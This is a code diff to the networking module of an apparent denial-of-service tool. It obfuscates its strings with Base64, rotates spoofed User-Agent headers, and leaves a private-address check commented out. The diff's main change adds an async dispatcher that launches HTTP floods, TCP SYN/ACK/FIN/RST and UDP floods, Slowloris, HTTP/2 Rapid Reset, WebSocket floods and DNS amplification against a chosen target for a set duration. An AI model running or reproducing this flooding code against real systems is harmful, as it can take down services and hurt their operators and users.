@@ -5,9 +5,11 @@ from urllib.parse import urlparse
 import base64
 import ipaddress
 
+
 # Utility function to decode Base64 strings
 def _decode_str(encoded: str) -> str:
     return base64.b64decode(encoded).decode("utf-8")
+
 
 def parse_url(url: str):
     if _decode_str("Oi8v") not in url:
@@ -18,54 +20,85 @@ def parse_url(url: str):
     if not parsed.scheme or not parsed.hostname:
         return None
 
-    '''# Reject private/reserved IP addresses to avoid local network abuse
+    """# Reject private/reserved IP addresses to avoid local network abuse
     try:
         host_ip = ipaddress.ip_address(parsed.hostname)
         if host_ip.is_private or host_ip.is_loopback or host_ip.is_multicast or host_ip.is_reserved:
             return None
     except ValueError:
         # hostname is not an IP literal, allow domain names
-        pass'''
+        pass"""
 
-    port = parsed.port or (443 if parsed.scheme.lower() == _decode_str("aHR0cHM=") else 80)
+    port = parsed.port or (
+        443 if parsed.scheme.lower() == _decode_str("aHR0cHM=") else 80
+    )
     path = parsed.path if parsed.path else _decode_str("Lw==")
     if parsed.query:
         path += _decode_str("Pw==") + parsed.query
 
     return Endpoint(host=parsed.hostname, port=port, scheme=parsed.scheme, path=path)
 
+
 # Endpoint Class
 class Endpoint:
-    def __init__(self, host: str, port: int = 80, scheme: str = _decode_str("aHR0cA=="), path: str = _decode_str("Lw==")):
+    def __init__(
+        self,
+        host: str,
+        port: int = 80,
+        scheme: str = _decode_str("aHR0cA=="),
+        path: str = _decode_str("Lw=="),
+    ):
         self.host = host
         self.port = port
         self.scheme = scheme
         self.path = path
+
 
 # Network Utilities
 class NetworkUtilities:
     def __init__(self):
         # Common User-Agent strings (Base64 encoded)
         self.user_agents = [
-            _decode_str("TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IENocm9tZS8xMTUuMCBTYWZhcmkvNTM3LjM2"),
-            _decode_str("TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgQ2hyb21lLzExNC4wIFNhZmFyaS81MzcuMzY="),
-            _decode_str("TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgU2FmYXJpLzYwNS4xLjE1IFZlcnNpb24vMTYuMw=="),
-            _decode_str("TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTE1LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTE1LjA="),
-            _decode_str("TW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxNl81KSBTYWZhcmkvNjA0LjEgVmVyc2lvbi8xNi4w"),
-            _decode_str("TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyB TTS1HOTkxQikgQ2hyb21lLzExNC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2"),
+            _decode_str(
+                "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IENocm9tZS8xMTUuMCBTYWZhcmkvNTM3LjM2"
+            ),
+            _decode_str(
+                "TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgQ2hyb21lLzExNC4wIFNhZmFyaS81MzcuMzY="
+            ),
+            _decode_str(
+                "TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgU2FmYXJpLzYwNS4xLjE1IFZlcnNpb24vMTYuMw=="
+            ),
+            _decode_str(
+                "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTE1LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTE1LjA="
+            ),
+            _decode_str(
+                "TW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxNl81KSBTYWZhcmkvNjA0LjEgVmVyc2lvbi8xNi4w"
+            ),
+            _decode_str(
+                "TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyB TTS1HOTkxQikgQ2hyb21lLzExNC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2"
+            ),
         ]
 
         # Reserved IP ranges (private, local, special)
         self._private_ip_ranges: List[Tuple[int, int]] = [
-            self._ip_to_int(_decode_str("MTAuMC4wLjA=")), self._ip_to_int(_decode_str("MTAuMjU1LjI1NS4yNTU=")),
-            self._ip_to_int(_decode_str("MTI3LjAuMC4w")), self._ip_to_int(_decode_str("MTI3LjI1NS4yNTUuMjU1")),
-            self._ip_to_int(_decode_str("MTcyLjE2LjAuMA==")), self._ip_to_int(_decode_str("MTcyLjMxLjI1NS4yNTU=")),
-            self._ip_to_int(_decode_str("MTkyLjE2OC4wLjA=")), self._ip_to_int(_decode_str("MTkyLjE2OC4yNTUuMjU1")),
-            self._ip_to_int(_decode_str("MTY5LjI1NC4wLjA=")), self._ip_to_int(_decode_str("MTY5LjI1NC4yNTUuMjU1")),
-            self._ip_to_int(_decode_str("MTAwLjY0LjAuMA==")), self._ip_to_int(_decode_str("MTAwLjEyNy4yNTUuMjU1")),
-            self._ip_to_int(_decode_str("MTk4LjE4LjAuMA==")), self._ip_to_int(_decode_str("MTk4LjE5LjI1NS4yNTU=")),
-            self._ip_to_int(_decode_str("MjI0LjAuMC4w")), self._ip_to_int(_decode_str("MjM5LjI1NS4yNTUuMjU1")),
-            self._ip_to_int(_decode_str("MjQwLjAuMC4w")), self._ip_to_int(_decode_str("MjU1LjI1NS4yNTUuMjU0")),
+            self._ip_to_int(_decode_str("MTAuMC4wLjA=")),
+            self._ip_to_int(_decode_str("MTAuMjU1LjI1NS4yNTU=")),
+            self._ip_to_int(_decode_str("MTI3LjAuMC4w")),
+            self._ip_to_int(_decode_str("MTI3LjI1NS4yNTUuMjU1")),
+            self._ip_to_int(_decode_str("MTcyLjE2LjAuMA==")),
+            self._ip_to_int(_decode_str("MTcyLjMxLjI1NS4yNTU=")),
+            self._ip_to_int(_decode_str("MTkyLjE2OC4wLjA=")),
+            self._ip_to_int(_decode_str("MTkyLjE2OC4yNTUuMjU1")),
+            self._ip_to_int(_decode_str("MTY5LjI1NC4wLjA=")),
+            self._ip_to_int(_decode_str("MTY5LjI1NC4yNTUuMjU1")),
+            self._ip_to_int(_decode_str("MTAwLjY0LjAuMA==")),
+            self._ip_to_int(_decode_str("MTAwLjEyNy4yNTUuMjU1")),
+            self._ip_to_int(_decode_str("MTk4LjE4LjAuMA==")),
+            self._ip_to_int(_decode_str("MTk4LjE5LjI1NS4yNTU=")),
+            self._ip_to_int(_decode_str("MjI0LjAuMC4w")),
+            self._ip_to_int(_decode_str("MjM5LjI1NS4yNTUuMjU1")),
+            self._ip_to_int(_decode_str("MjQwLjAuMC4w")),
+            self._ip_to_int(_decode_str("MjU1LjI1NS4yNTUuMjU0")),
         ]
         it = iter(self._private_ip_ranges)
         self._private_ip_ranges = [(s, e) for s, e in zip(it, it)]
@@ -96,7 +129,9 @@ class NetworkUtilities:
         )
 
     # Build full HTTP request
-    def build_request(self, endpoint, method: str = _decode_str("R0VU"), body: str = "") -> bytes:
+    def build_request(
+        self, endpoint, method: str = _decode_str("R0VU"), body: str = ""
+    ) -> bytes:
         method = method.upper()
         body_bytes = body.encode("utf-8") if isinstance(body, str) else body
 
@@ -107,16 +142,24 @@ class NetworkUtilities:
         # Host header
         host = endpoint.host.replace("\r", "").replace("\n", "")
         port = getattr(endpoint, "port", None)
-        headers += f"{_decode_str('SG9zdA==')}: {host}:{port}\r\n" if port and port not in (80, 443) else f"{_decode_str('SG9zdA==')}: {host}\r\n"
+        headers += (
+            f"{_decode_str('SG9zdA==')}: {host}:{port}\r\n"
+            if port and port not in (80, 443)
+            else f"{_decode_str('SG9zdA==')}: {host}\r\n"
+        )
 
         # User-Agent header
         ua = self.random_user_agent().replace("\r", "").replace("\n", "")
         headers += f"{_decode_str('VXNlci1BZ2VudA==')}: {ua}\r\n"
 
         # Content headers for POST/PUT/PATCH or if body exists
-        if method in (_decode_str("UE9TVA=="), _decode_str("UFVU"), _decode_str("UEFUQ0g=")) or body_bytes:
+        if (
+            method
+            in (_decode_str("UE9TVA=="), _decode_str("UFVU"), _decode_str("UEFUQ0g="))
+            or body_bytes
+        ):
             headers += f"{_decode_str('Q29udGVudC1MZW5ndGg=')}: {len(body_bytes)}\r\n"
-            if _decode_str('Q29udGVudC1UeXBlOg==') not in headers:
+            if _decode_str("Q29udGVudC1UeXBlOg==") not in headers:
                 headers += f"{_decode_str('Q29udGVudC1UeXBl')}: {_decode_str('YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PXV0Zi04')}\r\n"
 
         return (headers + "\r\n").encode("utf-8") + body_bytes
@@ -160,7 +203,11 @@ class NetworkUtilities:
     def create_random_ip(self) -> str:
         ranges = self._allowed_random_ip_ranges
         if not ranges:
-            raise RuntimeError(_decode_str("Tm8gYWxsb3dlZCBJUCByYW5nZXMgYXZhaWxhYmxlIGZvciByYW5kb21pemF0aW9uLg=="))
+            raise RuntimeError(
+                _decode_str(
+                    "Tm8gYWxsb3dlZCBJUCByYW5nZXMgYXZhaWxhYmxlIGZvciByYW5kb21pemF0aW9uLg=="
+                )
+            )
 
         total = sum((end - start + 1) for start, end in ranges)
         pick = randrange(total)
@@ -169,13 +216,23 @@ class NetworkUtilities:
             size = end - start + 1
             if pick < acc + size:
                 val = start + (pick - acc)
-                a, b, c, d = (val >> 24 & 0xFF, val >> 16 & 0xFF, val >> 8 & 0xFF, val & 0xFF)
+                a, b, c, d = (
+                    val >> 24 & 0xFF,
+                    val >> 16 & 0xFF,
+                    val >> 8 & 0xFF,
+                    val & 0xFF,
+                )
                 return f"{a}.{b}.{c}.{d}"
             acc += size
 
         # Fallback to last IP
         last = ranges[-1][1]
-        a, b, c, d = (last >> 24 & 0xFF, last >> 16 & 0xFF, last >> 8 & 0xFF, last & 0xFF)
+        a, b, c, d = (
+            last >> 24 & 0xFF,
+            last >> 16 & 0xFF,
+            last >> 8 & 0xFF,
+            last & 0xFF,
+        )
         return f"{a}.{b}.{c}.{d}"
 
     # Run multiple threads
@@ -184,26 +241,106 @@ class NetworkUtilities:
             t = Thread(target=func, args=args, daemon=True)
             t.start()
 
-    # Execute network request
-    def execute_request(self, endpoint, duration: int, method: str, threads: int):
+    # Execute network request (async)
+    def execute_request_async(self, endpoint, duration: int, method: str, threads: int):
+        import asyncio
+        from .layers import (
+            L7Async,
+            L4Async,
+            Slowloris,
+            H2RapidReset,
+            DNSAmplification,
+            WebSocketFlood,
+        )
 
-        def get_function(method: str) -> Callable:
-            from .layers import L7, L4, L3
-            
-            method = method.upper()
-            if method in (_decode_str("R0VU"), _decode_str("UE9TVA=="), _decode_str("UFVU"), _decode_str("REVMRVRF"), _decode_str("SEVBRA=="), _decode_str("RE5T")):
-                l7 = L7(endpoint, duration=duration)
-                return getattr(l7, method)
-            elif method in (_decode_str("QUNL"), _decode_str("U1lO"), _decode_str("RklO"), _decode_str("UlNU"), _decode_str("VENQ"), _decode_str("VURQ")):
-                l4 = L4(endpoint, duration=duration)
-                return getattr(l4, method)
-            elif method == _decode_str("SUNNUA=="):
-                l3 = L3(endpoint, duration=duration)
-                return getattr(l3, method)
-            
-            return
+        method = method.upper()
+        encoded_method = method.encode().decode("latin-1")
 
-        func = get_function(method)
-        if func:
-            args = () if method != _decode_str("RE5T") else (self.create_random_ip(),)
-            self.run_threads(func, args, threads)
+        async def run_flood():
+            if method in ("GET", "POST", "PUT", "DELETE", "HEAD"):
+                l7_async = L7Async(endpoint, duration=duration)
+                tasks = []
+                for _ in range(threads):
+                    tasks.append(asyncio.create_task(l7_async._send_request(method)))
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+                    await l7_async.close()
+
+            elif method in ("ACK", "SYN", "FIN", "RST", "TCP", "UDP"):
+                l4_async = L4Async(endpoint, duration=duration)
+                tasks = []
+                for _ in range(threads):
+                    if method == "ACK":
+                        tasks.append(asyncio.create_task(l4_async._send_tcp_async("A")))
+                    elif method == "SYN":
+                        tasks.append(asyncio.create_task(l4_async._send_tcp_async("S")))
+                    elif method == "FIN":
+                        tasks.append(asyncio.create_task(l4_async._send_tcp_async("F")))
+                    elif method == "RST":
+                        tasks.append(asyncio.create_task(l4_async._send_tcp_async("R")))
+                    elif method == "TCP":
+                        tasks.append(asyncio.create_task(l4_async._send_tcp_async("S")))
+                    elif method == "UDP":
+                        tasks.append(
+                            asyncio.create_task(l4_async._send_udp_async(b"hello"))
+                        )
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+
+            elif method == "SLOWLORIS":
+                slowloris = Slowloris(endpoint, duration=duration)
+                tasks = []
+                for _ in range(threads):
+                    tasks.append(asyncio.create_task(slowloris._send_slowloris()))
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+                    await slowloris.wait_done()
+
+            elif method == "H2RESET":
+                h2reset = H2RapidReset(endpoint, duration=duration)
+                tasks = []
+                for _ in range(threads):
+                    tasks.append(asyncio.create_task(h2reset._rapid_reset_raw()))
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+                    await h2reset.wait_done()
+
+            elif method == "WS":
+                ws_flood = WebSocketFlood(endpoint, duration=duration)
+                tasks = []
+                for _ in range(threads):
+                    tasks.append(asyncio.create_task(ws_flood._ws_flood()))
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+                    await ws_flood.wait_done()
+
+            elif method == "DNSAMP":
+                dns_amp = DNSAmplification(
+                    endpoint.host, endpoint.port, duration=duration
+                )
+                tasks = []
+                for _ in range(threads):
+                    tasks.append(asyncio.create_task(dns_amp._send_dns_amp()))
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+                    await dns_amp.wait_done()
+
+        asyncio.run(run_flood())
